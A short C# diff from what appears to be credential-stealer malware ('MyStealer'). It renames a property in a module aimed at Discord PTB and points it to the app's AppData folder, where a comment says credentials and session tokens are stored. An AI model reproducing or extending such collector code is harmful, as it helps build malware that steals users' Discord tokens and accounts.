@@ -7,7 +7,7 @@ namespace MyStealer.Collector.Browser.ChromiumBased
     // but it uses CEF as backend, and all credentials and session tokens are stored in cookies & local storage
     public class DiscordPTB : Discord
     {
-        public override string ModuleName => "Discord PTB";
+        public override string Name => "Discord PTB";
 
         protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb");
     }
